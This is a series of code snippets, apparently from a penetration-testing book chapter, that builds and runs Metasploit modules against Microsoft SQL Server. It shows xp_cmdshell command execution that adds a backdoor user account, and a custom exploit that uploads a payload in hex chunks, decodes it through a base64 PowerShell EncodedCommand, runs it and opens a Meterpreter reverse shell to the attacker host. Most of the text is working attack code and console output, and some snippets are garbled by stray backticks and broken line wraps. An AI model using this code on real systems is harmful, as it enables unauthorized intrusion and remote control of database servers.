["```\n use msf > `use admin/mssql/mssql_exec`\n msf auxiliary(mssql_exec) > `show options`\n\n  Module options:\n\n     Name      Current Setting                       Required  Description\n     ----      ---------------                       --------  -----------\n     CMD       cmd.exe /c echo OWNED > C:\\owned.exe  no        Command to execute\n     PASSWORD                                        no        The password for the\n                                                                 specified username\n     RHOST                                           yes       The target address\n     RPORT     1433                                  yes       The target port\n     USERNAME  sa                                    no\n        The username to authenticate as\n\n msf auxiliary(mssql_exec) `> set RHOST 172.16.32.136`\n  RHOST => 172.16.32.136\n msf auxiliary(mssql_exec) > `set CMD net user metasploit p@55w0rd /ADD`\n  CMD => net user metasploit p@55w0rd /ADD\n  msf auxiliary(mssql_exec) > `exploit`\n\n  [*] SQL Query: EXEC master..xp_cmdshell 'net user metasploit p@55w0rd /ADD'\n\n   output\n   ------\n The command completed successfully.\n\n  [*] Auxiliary module execution completed\n  msf auxiliary(mssql_exec) >\n```", "```\nroot@bt:/opt/framework3/msf3# nano modules/auxiliary/admin/mssql/mssql_exec.rb\n```", "```\n require 'msf/core'\n\n class Metasploit3 < Msf::Auxiliary\n\n      include Msf::Exploit::Remote::MSSQL\n\n          def run\n                  mssql_xpcmdshell(datastore['CMD'], true)\nif mssql_login_datastore\n          end\n```", "```\nroot@bt:/opt/framework3/msf3# `nano lib/msf/core/exploit/mssql.rb`\nroot@bt:/opt/framework3/msf3# `nano lib/msf/core/exploit/mssql_commands.rb`\n```", "```\n#\n        # Execute a system command via xp_cmdshell\n        #\n        def mssql_xpcmdshell(cmd,doprint=false,opts={})\n                force_enable = false\n                begin\n                        res = mssql_query(\"EXEC master..xp_cmdshell\n '#{cmd}'\", false, opts)\n```", "```\n# Re-enable the xp_cmdshell stored procedure in 2005 and 2008\ndef mssql_xpcmdshell_enable(opts={});\n\"exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec\nmaster.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;\"\n```", "```\nroot@bt:/opt/framework3/msf3# `cp modules/exploits/windows/mssql/mssql_payload.rb`\n      `modules/exploits/windows/mssql/mssql_powershell.rb`\n```", "```\nrequire 'msf/core' # require core libraries\n\nclass Metasploit3 < Msf::Exploit::Remote # define this as a remote exploit\n     Rank = ExcellentRanking # reliable exploit ranking\n\n     include Msf::Exploit::Remote::MSSQL # include the mssql.rb library\n\n     def initialize(info = {}) # initialize the basic template\n       super(update_info(info,\n               'Name'           => 'Microsoft SQL Server PowerShell Payload',\n               'Description'    => %q{\n                         This module will deliver our\n payload through Microsoft PowerShell\n                              using MSSQL based attack vectors.\n               },\n               'Author'         => [ 'David Kennedy \"ReL1K\"\n <kennedyd013[at]gmail.com>'],\n               'License'        => MSF_LICENSE,\n               'Version'        => '$Revision: 8771 $',\n               'References'     =>\n                    [\n                         [ 'URL', 'http://www.secmaniac.com' ]\n                    ],\n             'Platform'       => 'win', # target only windows\n               'Targets'        =>\n                    [\n                         [ 'Automatic', { } ], # automatic targeting\n                    ],\n             'DefaultTarget'  => 0\n               ))\n          register_options( # register options for the user to pick from\n               [\n\nOptBool.new('UsePowerShell',[ false, \"Use PowerShell as payload delivery\n                        method instead\", true]), # default to PowerShell\n               ])\n     end\n\n     def exploit # define our exploit here; it does nothing at this point\n\n        handler # call the Metasploit handler\n          disconnect # after handler disconnect\n     end\nend\n```", "```\nmsf > `use windows/mssql/mssql_powershell`\nmsf exploit(mssql_powershell) > `show options`\n\nModule options:\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   PASSWORD                        no        The password for the specified username\n   RHOST                           yes       The target address\n   RPORT          1433             yes       The target port\n   USERNAME       sa               no        The username to authenticate as\n   UsePowerShell  true             no        Use PowerShell\n as payload delivery method instead\n```", "```\ndef exploit\n\n          # if u/n and p/w didn't work throw error\n          if(not mssql_login_datastore)\n               print_status(`\"Invalid SQL Server credentials\"`)\n               return\n          end\n\n          # Use powershell method for payload delivery\n          if (datastore['UsePowerShell'])\n\n          powershell_upload_exec\n(Msf::Util::EXE.to_win32pe(framework,payload.encoded))\n\n            end\n            handler\n            disconnect\n     end\nend\n```", "```\nroot@bt:/opt/framework3/msf3# `nano lib/msf/core/exploit/mssql.rb`\n```", "```\n#\n     # Upload and execute a Windows binary through MS SQL queries and PowerShell\n     #\n     def powershell_upload_exec(exe, debug=false)\n\n          # hex converter\n          hex = exe.unpack(\"H*\")[0]\n          # create random alpha 8 character names\n          var_payload = rand_text_alpha(8)\n          print_status(\"Warning:\n This module will leave #{var_payload}.exe in the SQL\n            Server %TEMP% directory\")\n```", "```\n# Our payload converter grabs a hex file and converts it to binary through PowerShell\n\n `h2b` = \"$s = gc 'C:\\\\Windows\\\\Temp\\\\#{`var_payload`\n}';$s = [string]::Join('', $s);$s= $s.\n      Replace('`r',''); $s = $s.Replace(''`n','');$b = new-object byte[] $($s.Length/\n      2);0..$($b.Length-1) | %{$b[$_] = [Convert]\n::ToByte($s.Substring($($_*2),2),16)};\n      [IO.File]::WriteAllBytes('C:\\\\Windows\\\\Temp\\\\#{`var_payload`}.exe',$b)\"\n\n h2b_unicode=Rex::Text.to_unicode(h2b)\n\n  # base64 encoding allows us to perform execution through\n powershell without registry changes\n h2b_encoded = Rex::Text.encode_base64(h2b_unicode)\n\n print_status(\"Uploading the payload #{var_payload}, please be patient...\")\n```", "```\n idx=0\n cnt = 500\n while(idx < hex.length - 1)\n  mssql_xpcmdshell(\"cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\\\#{var_payload}\", false)\n  idx += cnt\n  end\n\n `print_status(\"Converting the payload utilizing PowerShell EncodedCommand...\")`\n  mssql_xpcmdshell(`\"powershell -EncodedCommand #{h2b_encoded}\"`, debug)\n  mssql_xpcmdshell(\"cmd.exe /c del %TEMP%\\\\#{var_payload}\", debug)\n  print_status(\"Executing the payload...\")\n  mssql_xpcmdshell(\"%TEMP%\\\\#{var_payload}.exe\", false, {:timeout => 1})\n  print_status(\"Be sure to cleanup #{var_payload}.exe...\")\n  end\n```", "```\n#\n# Upload and execute a Windows binary through MSSQL queries and Powershell\n#\ndef powershell_upload_exec(exe, debug=false)\n\n          # hex converter\n          hex = exe.unpack(\"H*\")[0]\n          # create random alpha 8 character names\n          #var_bypass  = rand_text_alpha(8)\n          var_payload = rand_text_alpha(8)\n          print_status(\"Warning: This module will leave #{var_payload}.exe in the SQL\n               Server %TEMP% directory\")\n          # our payload converter, grabs a hex file and converts\n it to binary for us through\n               powershell\n          h2b = \"$s = gc 'C:\\\\Windows\\\\Temp\\\\#{var_payload}';$s\n = [string]::Join('', $s);$s\n                = $s.Replace('`r',''); $s = $s.Replace('`n','');$b\n = new-object byte[]$($s\n                .Length/2);0..$($b.Length-1) | %{$b[$_] =\n [Convert]::ToByte($s.Substring\n                ($($_*2),2),16)};[IO.File]::WriteAllBytes\n('C:\\\\Windows\\\\Temp\\\\#{var_payload}\n                .exe',$b)\"\n          h2b_unicode=Rex::Text.to_unicode(h2b)\n          # base64 encode it, this allows us to perform execution\n through powershell without\n               registry changes\n          h2b_encoded = Rex::Text.encode_base64(h2b_unicode)\n          print_status(\"Uploading the payload #{var_payload}, please be patient...\")\n          idx = 0\n          cnt = 500\n          while(idx < hex.length - 1)\n               mssql_xpcmdshell(\"cmd.exe /c echo #{hex[idx,cnt]}\n>>%TEMP%\\\\#{var_payload}\", false)\n               idx += cnt\n          end\n          print_status(\"Converting the payload utilizing\n PowerShell EncodedCommand...\")\n          mssql_xpcmdshell(\"powershell -EncodedCommand #{h2b_encoded}\", debug)\n          mssql_xpcmdshell(\"cmd.exe /c del %TEMP%\\\\#{var_payload}\", debug)\n          print_status(\"Executing the payload...\")\n          mssql_xpcmdshell(\"%TEMP%\\\\#{var_payload}.exe\", false, {:timeout => 1})\n          print_status(\"Be sure to cleanup #{var_payload}.exe...\")\n     end\n```", "```\nmsf > `use windows/mssql/mssql_powershell`\nmsf exploit(mssql_powershell) > `set payload windows/meterpreter/reverse_tcp`\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(mssql_powershell) > `set LHOST 172.16.32.129`\nLHOST => 172.16.32.129\nmsf exploit(mssql_powershell) > `set RHOST 172.16.32.136`\nRHOST => 172.16.32.136\nmsf exploit(mssql_powershell) > `exploit`\n\n[*] Started reverse handler on 172.16.32.129:4444\n[*] Warning: This module will leave CztBAnfG.exe in the SQL Server %TEMP% directory\n[*] Uploading the payload CztBAnfG, please be patient...\n[*] Converting the payload utilizing PowerShell EncodedCommand...\n[*] Executing the payload...\n[*] Sending stage (748032 bytes) to 172.16.32.136\n[*] Be sure to cleanup CztBAnfG.exe...\n[*] Meterpreter session 1 opened (172.16.32.129:4444 ->\n 172.16.32.136:49164) at 2010-05-17\n       16:12:19 âˆ’0400\n\nmeterpreter >\n```"]